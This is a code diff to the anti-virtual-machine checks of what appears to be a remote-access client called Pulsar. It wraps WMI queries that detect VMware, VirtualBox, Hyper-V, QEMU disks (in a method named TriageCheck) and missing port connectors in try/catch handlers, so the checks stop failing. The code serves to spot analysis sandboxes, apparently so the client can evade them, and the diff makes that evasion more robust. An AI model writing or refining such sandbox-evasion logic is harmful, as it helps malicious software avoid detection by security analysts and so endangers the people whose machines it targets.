@@ -95,20 +95,27 @@ namespace Pulsar.Client.Anti.VM
         /// <returns>True if VMware or VirtualBox is detected, otherwise false.</returns>
         public static bool CheckForVMwareAndVirtualBox()
         {
-            using (ManagementObjectSearcher ObjectSearcher = new ManagementObjectSearcher("Select * from Win32_ComputerSystem"))
+            try
             {
-                using (ManagementObjectCollection ObjectItems = ObjectSearcher.Get())
+                using (ManagementObjectSearcher ObjectSearcher = new ManagementObjectSearcher("Select * from Win32_ComputerSystem"))
                 {
-                    foreach (ManagementBaseObject Item in ObjectItems)
+                    using (ManagementObjectCollection ObjectItems = ObjectSearcher.Get())
                     {
-                        string ManufacturerString = Item["Manufacturer"].ToString().ToLower();
-                        string ModelName = Item["Model"].ToString();
-                        if ((ManufacturerString == "microsoft corporation" && Utils.Contains(ModelName.ToUpperInvariant(), "VIRTUAL") || Utils.Contains(ManufacturerString, "vmware")))
+                        foreach (ManagementBaseObject Item in ObjectItems)
                         {
-                            return true;
+                            string ManufacturerString = Item["Manufacturer"].ToString().ToLower();
+                            string ModelName = Item["Model"].ToString();
+                            if ((ManufacturerString == "microsoft corporation" && Utils.Contains(ModelName.ToUpperInvariant(), "VIRTUAL") || Utils.Contains(ManufacturerString, "vmware")))
+                            {
+                                return true;
+                            }
                         }
                     }
                 }
+            }
+            catch
+            {
+                // WMI not available, assume not VM
             }
             return false;
         }
@@ -257,16 +264,23 @@ namespace Pulsar.Client.Anti.VM
         /// <returns>True if specific disk drive models are detected, otherwise false.</returns>
         public static bool TriageCheck()
         {
-            using (var searcher = new ManagementObjectSearcher("SELECT * FROM Win32_DiskDrive"))
+            try
             {
-                foreach (var item in searcher.Get())
+                using (var searcher = new ManagementObjectSearcher("SELECT * FROM Win32_DiskDrive"))
                 {
-                    string model = item["Model"].ToString();
-                    if (Utils.Contains(model, "DADY HARDDISK") || Utils.Contains(model, "QEMU HARDDISK"))
+                    foreach (var item in searcher.Get())
                     {
-                        return true;
+                        string model = item["Model"].ToString();
+                        if (Utils.Contains(model, "DADY HARDDISK") || Utils.Contains(model, "QEMU HARDDISK"))
+                        {
+                            return true;
+                        }
                     }
                 }
+            }
+            catch
+            {
+                // WMI not available, assume not VM
             }
             return false;
         }
@@ -309,8 +323,15 @@ namespace Pulsar.Client.Anti.VM
             /// <returns>True if no port connectors are found, indicating a possible VM environment, otherwise false.</returns>
             public static bool PortConnectionAntiVM()
             {
-                if (new ManagementObjectSearcher("SELECT * FROM Win32_PortConnector").Get().Count == 0)
-                    return true;
+                try
+                {
+                    if (new ManagementObjectSearcher("SELECT * FROM Win32_PortConnector").Get().Count == 0)
+                        return true;
+                }
+                catch
+                {
+                    // WMI not available, assume ports exist
+                }
                 return false;
             }
 
